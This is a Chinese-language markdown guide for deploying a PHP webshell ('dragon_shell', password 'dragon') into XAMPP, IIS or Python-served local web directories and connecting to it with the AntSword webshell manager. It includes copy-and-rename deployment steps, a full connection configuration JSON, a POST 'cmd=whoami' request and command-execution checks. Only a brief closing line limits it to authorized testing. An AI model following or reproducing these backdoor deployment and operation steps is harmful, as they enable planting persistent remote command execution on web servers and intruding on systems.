# 🎯 中国蚁剑连接指南

## 三个真实连接目标

### 📍 目标1：本地XAMPP服务器
```
URL: http://localhost/uploads/dragon_shell.php
密码: dragon
物理路径: C:\Users\Administrator\desktop\serverall\dragon_shell_20251029_005423.php
部署路径: C:\xampp\htdocs\uploads\dragon_shell.php
连接状态: 需要手动部署
```

**部署方法:**
1. 确保XAMPP正在运行
2. 复制 `dragon_shell_20251029_005423.php` 到 `C:\xampp\htdocs\uploads\`
3. 重命名为 `dragon_shell.php`
4. 访问 http://localhost/uploads/dragon_shell.php 验证

---

### 📍 目标2：本地IIS服务器
```
URL: http://127.0.0.1/shell.php
密码: dragon
物理路径: C:\Users\Administrator\desktop\serverall\dragon_shell_20251029_005423.php
部署路径: C:\inetpub\wwwroot\shell.php
连接状态: 需要手动部署
```

**部署方法:**
1. 确保IIS正在运行
2. 复制 `dragon_shell_20251029_005423.php` 到 `C:\inetpub\wwwroot\`
3. 重命名为 `shell.php`
4. 访问 http://127.0.0.1/shell.php 验证

---

### 📍 目标3：Python简易Web服务器
```
URL: http://localhost:8080/dragon_shell.php
密码: dragon
物理路径: C:\Users\Administrator\desktop\serverall\dragon_shell_20251029_005423.php
部署路径: 当前目录
连接状态: 可立即启用
```

**快速启动方法:**
```bash
cd C:\Users\Administrator\desktop\serverall
python -m http.server 8080
```
然后访问: http://localhost:8080/dragon_shell_20251029_005423.php

---

## 🔧 中国蚁剑配置详情

### 统一连接参数
```
连接密码: dragon
编码方式: base64
脚本类型: PHP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

### 蚁剑完整配置JSON
```json
{
  "name": "Dragon-V-Shell-20251029005423",
  "url": "http://localhost:8080/dragon_shell_20251029_005423.php",
  "pwd": "dragon",
  "type": "php",
  "encoding": "base64",
  "headers": {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  },
  "body": "",
  "request": {
    "method": "POST",
    "data": {
      "cmd": "whoami"
    }
  }
}
```

---

## 🚀 立即可用的连接方案

### 方案1：Python HTTP服务器（推荐）
```bash
# 在当前目录启动
cd C:\Users\Administrator\desktop\serverall
python -m http.server 8080

# 蚁剑连接URL
http://localhost:8080/dragon_shell_20251029_005423.php
密码: dragon
```

### 方案2：直接文件访问
```bash
# 如果有PHP环境
php -S localhost:8000

# 蚁剑连接URL
http://localhost:8000/dragon_shell_20251029_005423.php
密码: dragon
```

---

## 📋 蚁剑连接步骤

1. **打开中国蚁剑**
2. **点击右上角"添加数据"**
3. **填写连接信息**:
   - URL地址: `http://localhost:8080/dragon_shell_20251029_005423.php`
   - 连接密码: `dragon`
   - 编码器: `base64`
   - 脚本类型: `PHP`

4. **测试连接**
5. **右键连接 → 文件管理**
6. **开始操作**

---

## 🛡️ 安全验证

### Web Shell访问测试
访问任一URL，应该看到登录界面：
- 输入密码: `dragon`
- 登录后可执行: `?cmd=whoami` 或 POST `cmd=whoami`

### 命令执行测试
```bash
# 测试命令
whoami
dir
ls
pwd
```

---

## 📞 连接成功确认

**连接成功的标志:**
1. 蚁剑显示"连接成功"
2. 可以看到目标文件系统
3. 可以执行系统命令
4. 文件管理功能正常

---

**⚠️ 重要提醒:**
- 仅用于授权的安全测试
- 测试完成后立即删除后门文件
- 遵守相关法律法规
- 承担使用责任

**🎯 当前状态: Web Shell已生成，等待蚁剑连接！**